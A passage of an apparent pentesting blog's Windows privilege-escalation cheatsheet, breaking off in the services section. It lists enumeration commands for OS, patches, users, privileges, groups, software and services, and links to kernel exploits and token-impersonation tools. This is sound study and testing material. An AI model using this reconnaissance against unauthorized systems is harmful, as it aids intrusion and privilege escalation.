<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Windows - 0xbro@blog</title> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.7.1 --> <title>Windows | 0xbro@blog</title> <meta name="generator" content="Jekyll v4.2.0" /> <meta property="og:title" content="Windows" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="14 Jun 2021 Privilege Escalation - Windows #Windows #privesc #windows-privesc" /> <meta property="og:description" content="14 Jun 2021 Privilege Escalation - Windows #Windows #privesc #windows-privesc" /> <link rel="canonical" href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" /> <meta property="og:url" content="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" /> <meta property="og:site_name" content="0xbro@blog" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2021-06-14T00:00:00+02:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Windows" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Windows","dateModified":"2021-06-14T00:00:00+02:00","url":"https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/","datePublished":"2021-06-14T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/"},"description":"14 Jun 2021 Privilege Escalation - Windows #Windows #privesc #windows-privesc","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a href="https://maoutis.github.io/" class="site-title lh-tight"> 0xbro@blog </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <div class="nav-category">Pages</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/" class="nav-list-link">Home</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/about/" class="nav-list-link">About me</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/contacts/" class="nav-list-link">Contact me</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/achievements/" class="nav-list-link">Roadmap</a></li></ul> <div class="nav-category">Writeups</div> <ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/writeups/HackTheBox/" class="nav-list-link">HackTheBox</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-08-28-Knife/" class="nav-list-link">Knife</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-08-07-Love/" class="nav-list-link">Love</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-07-24-Armageddon/" class="nav-list-link">Armageddon</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-07-31-TheNotebook/" class="nav-list-link">TheNotebook</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-26-Spectra/" class="nav-list-link">Spectra</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-07-03-Ophiuchi/" class="nav-list-link">Ophiuchi</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-05-ScriptKiddie/" class="nav-list-link">ScriptKiddie</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" class="nav-list-link">Tenet</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-05-22-Delivery/" class="nav-list-link">Delivery</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-05-14-Ready/" class="nav-list-link">Ready</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" class="nav-list-link">Tabby</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-05-30-Blunder/" class="nav-list-link">Blunder</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-03-14-Traceback/" class="nav-list-link">Traceback</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-01-04-OpenAdmin/" class="nav-list-link">OpenAdmin</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-30-Obscurity/" class="nav-list-link">Obscurity</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-16-Traverxec/" class="nav-list-link">Traverxec</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-02-Postman/" class="nav-list-link">Postman</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-06-08-Writeup/" class="nav-list-link">Writeup</a></li></ul></li></ul> <div class="nav-category">Tool cheatsheets</div> <ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Misc/" class="nav-list-link">Misc</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/Dynamic%20Servers/" class="nav-list-link">Dynamic Servers</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/impacket/" class="nav-list-link">Impacket</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/netcat/" class="nav-list-link">netcat (nc)</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/powercat/" class="nav-list-link">powercat</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Terms%20&%20Editors/" class="nav-list-link">Terms & Editors</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Terms%20&%20Editors/Tmux/" class="nav-list-link">Tmux</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/" class="nav-list-link">Traffic Sniffer</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/tcpdump/" class="nav-list-link">tcpdump</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/wireshark/" class="nav-list-link">wireshark</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/" class="nav-list-link">Web Busting & Fuzzing</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/ffuf/" class="nav-list-link">ffuf</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/gobuster/" class="nav-list-link">gobuster</a></li></ul></li></ul> <div class="nav-category">Pentest cheatsheets</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/pentest-cheatsheets/file-transfer/" class="nav-list-link">File transfer</a></li><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/" class="nav-list-link">Privilege Escalation</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Linux/" class="nav-list-link">Linux</a></li><li class="nav-list-item active"><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" class="nav-list-link active">Windows</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Maintaining%20the%20access/" class="nav-list-link">Maintaining the access</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/pentest-cheatsheets/shells/" class="nav-list-link">Shells</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Shells/rev-shells/" class="nav-list-link">Reverse shell cheatsheet</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Shells/shell-upgrade/" class="nav-list-link">Upgrade your shell</a></li></ul></li></ul> <div class="nav-category">Articles and Posts</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/posts/2021-06-04-My-OSCP-Journey/" class="nav-list-link">My OSCP Journey</a></li></ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search 0xbro@blog" aria-label="Search 0xbro@blog" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="/support-me/" class="site-button" > Support me! </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"> <li class="breadcrumb-nav-list-item"><a href="">Privilege Escalation</a></li> <li class="breadcrumb-nav-list-item"><span>Windows</span></li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <style> .time { text-align: center; margin-top: 30px; font-family: 'Open Sans', sans-serif; font-weight: 300; font-style: normal; } </style> <p class="time">14 Jun 2021</p> <h1 align="center"> Privilege Escalation - Windows </h1> <p class="time" style="font-size: 75%;"> #Windows #privesc #windows-privesc </p><hr /> <h2 class="no_toc text-delta" id="table-of-contents"> <a href="#table-of-contents" class="anchor-heading" aria-labelledby="table-of-contents"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Table of contents </h2> <ol id="markdown-toc"> <li><a href="#enumerate-hostname" id="markdown-toc-enumerate-hostname">Enumerate Hostname</a></li> <li><a href="#enumerate-os-version--architecture" id="markdown-toc-enumerate-os-version--architecture">Enumerate OS Version &amp; Architecture</a></li> <li><a href="#enumerate-unmounted-disksdrives" id="markdown-toc-enumerate-unmounted-disksdrives">Enumerate Unmounted Disks/Drives</a></li> <li><a href="#enumerate-users" id="markdown-toc-enumerate-users">Enumerate Users</a></li> <li><a href="#enumerate-groups" id="markdown-toc-enumerate-groups">Enumerate Groups</a></li> <li><a href="#enumerate-installed-applications" id="markdown-toc-enumerate-installed-applications">Enumerate Installed Applications</a></li> <li><a href="#enumerate-running-processes-and-services" id="markdown-toc-enumerate-running-processes-and-services">Enumerate Running Processes and Services</a></li> <li><a href="#enumerate-unquoted-paths" id="markdown-toc-enumerate-unquoted-paths">Enumerate Unquoted paths</a></li> <li><a href="#path-interception" id="markdown-toc-path-interception">$PATH Interception</a></li> <li><a href="#enumerate-services-permissions" id="markdown-toc-enumerate-services-permissions">Enumerate Services Permissions</a></li> <li><a href="#enuemrate--registry-permissions" id="markdown-toc-enuemrate--registry-permissions">Enuemrate Registry permissions</a></li> <li><a href="#enumerate-directories-permissions" id="markdown-toc-enumerate-directories-permissions">Enumerate Directories Permissions</a></li> <li><a href="#enumerate-scheduled-tasks" id="markdown-toc-enumerate-scheduled-tasks">Enumerate Scheduled Tasks</a></li> <li><a href="#what-is-ran-at-startup" id="markdown-toc-what-is-ran-at-startup">What is ran at startup?</a></li> <li><a href="#enumerate-alwaysinstallelevated-and-binaries-that-autoelevate" id="markdown-toc-enumerate-alwaysinstallelevated-and-binaries-that-autoelevate">Enumerate AlwaysInstallElevated and binaries that AutoElevate</a></li> <li><a href="#enumerate-networking-information" id="markdown-toc-enumerate-networking-information">Enumerate Networking Information</a></li> <li><a href="#enumerate-firewall-status-and-rules" id="markdown-toc-enumerate-firewall-status-and-rules">Enumerate Firewall Status and Rules</a></li> <li><a href="#enumerate-antivirus" id="markdown-toc-enumerate-antivirus">Enumerate Antivirus</a></li> <li><a href="#enumerate-device-drivers-and-kernel-modules" id="markdown-toc-enumerate-device-drivers-and-kernel-modules">Enumerate Device Drivers and Kernel Modules</a></li> <li><a href="#windows-subsystem-for-linux-wsl" id="markdown-toc-windows-subsystem-for-linux-wsl">Windows Subsystem for Linux (WSL)</a></li> <li><a href="#credentials" id="markdown-toc-credentials">Credentials</a></li> <li><a href="#interesting-files-and-sensitive-information" id="markdown-toc-interesting-files-and-sensitive-information">Interesting Files and Sensitive Information</a></li> <li><a href="#from-local-administrator-to-nt-system" id="markdown-toc-from-local-administrator-to-nt-system">From local administrator to NT SYSTEM</a></li> <li><a href="#logs" id="markdown-toc-logs">Logs</a></li> </ol><hr /> <h2 id="enumerate-hostname"> <a href="#enumerate-hostname" class="anchor-heading" aria-labelledby="enumerate-hostname"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Hostname </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\student</span><span class="err">&gt;</span><span class="nx">hostname</span><span class="w">
</span><span class="n">client251</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-os-version--architecture"> <a href="#enumerate-os-version--architecture" class="anchor-heading" aria-labelledby="enumerate-os-version--architecture"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate OS Version &amp; Architecture </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># What is the OS and architecture? Is it missing any patches?</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">
</span><span class="nx">systeminfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Name"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Version"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"System Type"</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">ReleaseId</span><span class="w">
</span><span class="p">(</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"</span><span class="p">)</span><span class="o">.</span><span class="nf">ReleaseId</span><span class="w">

</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="nx">Description</span><span class="p">,</span><span class="nx">HotFixID</span><span class="p">,</span><span class="nx">InstalledOn</span><span class="w"> </span><span class="c">#Patches</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">os</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">osarchitecture</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">PROCESSOR_ARCHITECTURE</span><span class="o">%</span><span class="w"> </span><span class="c">#Get system architecture</span><span class="w">

</span><span class="c"># Enumerate Security Patch</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="p">,</span><span class="w"> </span><span class="nx">HotFixID</span><span class="p">,</span><span class="w"> </span><span class="nx">InstalledOn</span><span class="w">
</span></code></pre></div></div> <ul> <li>Any Kernel Exploit? Check using both Sherlock, Watson and windows-exploit-suggester</li> <li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li> </ul> <h2 id="enumerate-unmounted-disksdrives"> <a href="#enumerate-unmounted-disksdrives" class="anchor-heading" aria-labelledby="enumerate-unmounted-disksdrives"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Unmounted Disks/Drives </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Are there any other connected drives?</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">logicaldisk</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">caption</span><span class="p">,</span><span class="nx">description</span><span class="p">,</span><span class="nx">providername</span><span class="w">
</span><span class="n">Get-PSDrive</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Provider</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"Microsoft.PowerShell.Core\FileSystem"</span><span class="p">}</span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Root</span><span class="w">
</span><span class="n">mountvol</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-users"> <a href="#enumerate-users" class="anchor-heading" aria-labelledby="enumerate-users"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Users </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Who are you?</span><span class="w">
</span><span class="n">whoami</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">username</span><span class="o">%</span><span class="w">

</span><span class="c"># Any interesting user privileges?</span><span class="w">
</span><span class="c">## Note: The State column does not mean that the user does or does not have access to this privilege.</span><span class="w">
</span><span class="c">## If the privilege is listed, then that user has it.</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># What users are on the system? Any old user profiles that weren’t cleaned up?</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">/ad</span><span class="w"> </span><span class="s2">"C:\Users\"</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">/ad</span><span class="w"> </span><span class="s2">"C:\Documents and Settings\"</span><span class="w"> </span><span class="c"># Windows XP and below</span><span class="w">
</span><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Enabled</span><span class="p">,</span><span class="nx">LastLogon</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="w">

</span><span class="c"># Is anyone else logged in?</span><span class="w">
</span><span class="n">qwinsta</span><span class="w">
</span></code></pre></div></div> <ul> <li>SeImpersonatePrivilege exploitation with <a href="http://ohpe.it/juicy-potato/">JuicyPotato</a> (JP doesn’t work on Windows Server 2019 and Windows 10 1809 + Try RoguePotato or PrintSpoofer!)</li> <li><a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilege</a> exploitation</li> <li>Token Impersonation –&gt; RottenPotato</li> <li>Check if you have <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation">any of these tokens enabled</a>: <strong>SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege</strong>?</li> <li><a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></li> </ul> <h2 id="enumerate-groups"> <a href="#enumerate-groups" class="anchor-heading" aria-labelledby="enumerate-groups"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Groups </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In which groups am I?</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">

</span><span class="c"># What groups are on the system?</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w">
</span><span class="n">Get-LocalGroup</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Name</span><span class="w">

</span><span class="c"># Are any of the users in the Administrators group?</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">
</span><span class="n">Get-LocalGroupMember</span><span class="w"> </span><span class="nx">Administrators</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PrincipalSource</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-installed-applications"> <a href="#enumerate-installed-applications" class="anchor-heading" aria-labelledby="enumerate-installed-applications"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Installed Applications </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># What software is installed?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/a</span><span class="w"> </span><span class="s2">"C:\Program Files"</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/a</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE</span><span class="w">

</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s1">'C:\Program Files'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Program Files (x86)'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Parent</span><span class="p">,</span><span class="nx">Name</span><span class="p">,</span><span class="nx">LastWriteTime</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">Registry::HKEY_LOCAL_MACHINE\SOFTWARE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Name</span><span class="w">

</span><span class="c"># Enumerate application</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">version</span><span class="p">,</span><span class="w"> </span><span class="nx">vendor</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-running-processes-and-services"> <a href="#enumerate-running-processes-and-services" class="anchor-heading" aria-labelledby="enumerate-running-processes-and-services"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Running Processes and Services </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it? See Port Forwarding in Appendix.</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/svc</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/v</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">/fi</span><span class="w"> </span><span class="s2">"username eq system"</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">brief</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"c:\windows"</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">queryex</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="w"> </span><span class="n">service</span><span class="w">
</span><span class="nx">sc</span><span class="w"> </span><span class="nx">query</span><span class="w">		</span><span class="c"># Query the current status of a service</span><span class="w">

</span><span class="c"># Powershell</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">StartName</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'Running'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">startname</span><span class="p">,</span><span class="w"> </span><span class="nx">startmode</span><span class="w">
</span><span class="c"># This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.</span><span class="w">
